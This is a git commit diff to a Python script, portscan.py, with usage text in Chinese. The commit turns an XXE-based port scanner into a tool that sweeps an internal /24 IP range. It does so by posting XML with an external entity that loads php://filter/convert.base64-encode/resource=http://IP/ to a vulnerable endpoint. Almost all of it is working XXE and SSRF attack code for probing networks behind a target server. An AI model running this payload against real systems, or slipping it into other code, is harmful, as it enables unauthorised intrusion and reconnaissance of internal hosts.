b4bc1a9aa4017b4143e9b116e68f4a87e133bd06
TeamsSix <49087564+teamssix@users.noreply.github.com>
2019-12-20 22:50:03 +0800

    Update portscan.py

--- portscan.py
+++ portscan.py
@@ -1,33 +1,35 @@
+import sys
 import requests
 import base64
-import sys
 
-def XXE(url,target,port):
-	xml = """<?xml version="1.0" encoding="utf-8"?> """
-	xml = xml + "\r\n" + """<!DOCTYPE data SYSTEM "http://{}:{}""".format(target,port) + """/" ["""
-	xml = xml + "\r\n" + """<!ELEMENT data (#PCDATA)> """
-	xml = xml + "\r\n" + """]>"""
-	xml = xml + "\r\n" + """<data>7</data>"""
-	r = requests.post(url, data=xml)
-	print('[+] ',port,r.elapsed.total_seconds())
+def XXE(url,ip,string):
+	try:
+		xml = """<?xml version="1.0" encoding="ISO-8859-1"?>"""
+		xml = xml + "\r\n" + """<!DOCTYPE foo [ <!ELEMENT foo ANY >"""
+		xml = xml + "\r\n" + """<!ENTITY xxe SYSTEM """ + '"' + string + '"' + """>]>"""
+		xml = xml + "\r\n" + """<xml>"""
+		xml = xml + "\r\n" + """    <stuff>&xxe;</stuff>"""
+		xml = xml + "\r\n" + """</xml>"""
+		x = requests.post(url, data=xml, headers=headers, timeout=5).text
+		coded_string = x.split(' ')[-2]
+		print(' [+]',ip,'Successfully Found !!!')
+	except:	
+		print(' [-]',ip,'Error')
+		pass
+
 
 if __name__ == '__main__':
+	headers = {'Content-Type':'application/xml'}
 	try:
 		print('''
-[!] 用法：python3 portscan.py 漏洞网址 带扫描的目标IP 扫描端口范围 
-[!] 示例：python3 portscan.py http://192.168.38.132/xxe_test.php 192.168.38.129 1-65535
-						''')
+[!] 用法：python3 inhostscan.py 漏洞网址 带扫描的IP段
+[!] 示例：python3 inhostscan.py http://192.168.38.132/xxe_test.php 192.168.38
+									''')
 		url = sys.argv[1]
-		target = sys.argv[2]
-		ports = sys.argv[3]
-		start_port = int(ports.split('-')[0])
-		if len(ports.split('-')) == 1:
-			end_port = start_port + 1
-		elif len(ports.split('-')) == 2:
-			end_port = int((ports.split('-')[1])) + 1
-		else:
-			print('端口输入有误，请修改后重新执行')
-		for i in range(start_port,end_port):
-			XXE(url,target, str(i))
+		ip_s = sys.argv[2]
+		for i in range(1, 255):
+			ip = ip_s + '.' + str(i)
+			string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'
+			XXE(url,ip, string)
 	except:
 		print('[!] 请检查命令是否有误')
